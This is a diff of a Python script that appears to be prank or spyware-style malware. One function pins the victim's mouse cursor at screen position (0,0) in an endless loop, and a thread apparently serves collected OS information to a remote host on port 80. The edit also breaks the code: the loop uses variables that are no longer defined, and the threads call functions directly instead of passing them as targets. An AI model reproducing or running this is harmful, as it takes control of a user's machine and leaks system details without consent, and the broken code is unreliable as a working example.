@@ -23,18 +23,16 @@ HOST = "" # your local ip address
 PORT = 80
 BUFFER = 1024*3
 
-
-def lock_mouse(X, Y, time_in_milliseconds):
-    num = 0
+def lock_mouse(X, Y, freedom):
     pos = (X,Y)
     mouse.move(X, Y)
     while True:
         num += 1
         if mouse.get_position() != pos:
             mouse.move(pos[0], pos[1])
-            sleep(0.1)
+            sleep(freedom)
         else:
-            num += 1
+            pass
         
         if num >= time_in_milliseconds:
             break
@@ -88,5 +86,5 @@ def get_os_info():
         info_list.append(i)
 
 
-lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,100000)).start()
+lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,0.01)).start()
 send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
